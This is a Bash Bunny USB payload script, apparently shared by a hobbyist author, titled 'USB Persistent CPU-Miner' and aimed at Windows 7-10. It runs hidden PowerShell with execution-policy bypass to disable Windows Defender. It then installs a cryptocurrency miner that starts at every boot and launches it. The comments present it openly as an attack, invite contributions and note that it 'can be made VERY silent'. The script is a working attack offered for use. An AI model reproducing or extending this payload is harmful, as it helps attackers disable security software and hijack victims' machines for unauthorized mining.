#!/bin/bash
#
# Title:         USB Persistent CPU-Miner
# Author:        Rinilyn
# Version:       0.1
# Target:        Windows 7-10
# Category:      Exploiting Resources



# I would like to thank mainly Ar1k88. His payload inspired me to start such a project and i wanted to improve it.
# Also thank you to C1PH3R for letting me use his Anti-AV script.
# 
# Description: This payload will immeadiatly run a miner via powershell but will also install the same miner so that it can be used after 
# restart. The payload is not yet complete because AV might detect the miner at boot and remove it.
#
# Contribution: We hope to see this payload as efficient as possible and add as much features as possible to it. Feel free to
# Edit/Add or Modify anything you see fit and you will be thanked for your contribution!
#
# How it works: The bunny will start by killing AV and after that it will run a non-silent process of the cpu miner and then silently install 
# the miner with all its files to your pc for startup.I cannot teach you how to run the miner silently.Please do not add silence when contributing to it.
# If you wish to contribute,please follow this link and help me make it better:
#
# https://github.com/Rinilyn/USB-Persistent-CPU-Miner
#
# CONFIGURATION:
#
# You must read and apply what the README file says. Otherwise the payload will not work.
#
# This payload is not very LED friendly,and a little poorly made. But the attack Works! It is fast and can be made VERY silent.
# Do not abuse the force!

LED START

Q DELAY 300

ATTACKMODE HID RO_STORAGE

LED ATTACK

#Disable AntiVirus (Windows Defender)
RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\disable-anti-virus.ps1')"

Q DELAY 5000
# Installing the miner silently at boot
RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\PersBunnyMiner.exe')"

Q DELAY 5000
# Running the non-silent miner
RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\1.cmd')"

Q DELAY 5000

LED FINISH